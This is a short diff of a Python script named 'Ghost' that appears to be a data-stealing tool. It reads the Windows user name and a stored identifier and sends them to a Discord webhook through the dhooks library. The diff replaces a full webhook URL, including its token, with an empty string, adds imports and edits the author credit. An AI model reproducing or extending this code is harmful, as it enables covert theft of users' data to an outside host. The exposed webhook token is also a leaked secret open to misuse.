@@ -1,8 +1,8 @@
-import requests, os, re, subprocess, sys, shutil
+import requests, os, re, subprocess, sys, shutil, string, random
 from dhooks import Webhook, Embed
 from winreg import *
 
-#by f6ll!
+#by @f6ll
 
 class Ghost():
     def __init__(self, *args, **kwargs):
@@ -54,7 +54,7 @@ def GhostIdentifier():
  
 
 def GhostProcess():
-    hook = Webhook("https://discord.com/api/webhooks/830185249711063041/VQnjd8PliwisjGEnCtVv2bRi0Af3B4WZnrM2daRmyx23i1kZHn9jg7enHuupTYShLusV")
+    hook = Webhook("")
     user = os.getenv("UserName")
     ghost_getidentity =  open('ght.txt', 'r')
     identifiercode = ghost_getidentity.read()
